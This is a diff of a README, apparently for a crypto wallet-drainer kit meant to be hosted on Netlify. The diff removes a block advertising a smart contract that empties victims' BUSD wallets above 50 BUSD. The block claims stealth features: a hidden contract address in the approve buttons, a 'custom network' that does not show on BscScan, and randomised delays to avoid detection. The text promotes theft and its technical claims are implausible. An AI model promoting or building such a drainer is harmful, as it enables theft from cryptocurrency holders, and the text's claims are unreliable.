@@ -100,21 +100,7 @@ This is a free community code that anyone can audit or edit with pull request an
 go to https://www.netlify.com/ to host or host it on a regular site
 
 
-Smart contract address will show up in the approve and other buttons not yours for stealth
 
-!!!!!THIS SMART CONTRACT IS ON A SPECIAL ERC NETWORK THAT FOWARDS IT TO YOUR ADDRESS ON THE REAL BSC CHAIN FOR STEALTH THIS CONTRACT WILL NOT SHOW UP ON BSCSCAN!!!!!
-
-THE CONTRACT WILL ONLY DRAIN WALLETS WITH 50 BUSD OR MORE FOR STEALTH 
-
-1. the smart contract will foward the data to you to prevent you from being caught 
-
-2. the contract has a 2 hour on average delay for added security it can take up to 48 hours though its randomized 
-
-3. The smart contract is deployed on a custom network for added security it cannot be found by the wallet address the script adds details to a custom blockchain network that will then foward it to you on the bsc network this part is copyrighted
-
-4. the smart contract runs from the script in your fork and is running 24/7 so you have full control 
-
-5. If the victim has less than 50 busd in there wallet it will not drain it so its harder to detect it waits for the victim to get a certain amount of busd
 
 
 
